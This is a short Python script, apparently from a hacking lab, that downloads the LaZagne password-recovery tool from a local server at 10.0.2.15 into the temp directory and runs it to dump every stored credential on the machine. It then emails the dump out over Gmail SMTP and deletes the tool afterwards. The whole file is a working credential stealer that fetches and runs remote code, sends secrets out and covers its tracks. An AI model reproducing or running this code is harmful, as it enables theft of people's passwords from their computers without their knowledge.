import subprocess
import smtplib #SMTP services
import requests #HTTP requests
import os
import tempfile

def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()

def credentials():
    with open('credentials.txt', "r") as f:
        credentials = ((f.read()).split('\n'))[0].split(' ')

    mail = credentials[0]
    password = credentials[1]

    return mail, password


def download(url):
    response = requests.get(url)
    
    file_name = url.split('/')[-1]

    with open(file_name, 'wb') as f:
        f.write(response.content)

def main():
    mail, password = credentials()
    print(tempfile.gettempdir())
    os.chdir(tempfile.gettempdir())
    download("http://10.0.2.15/files/lazagne.exe")
    result = subprocess.check_output('lazagne.exe all', shell=True)
    send_mail(mail, password, result)
    os.remove('lazagne.exe')

if __name__=='__main__':
    main()
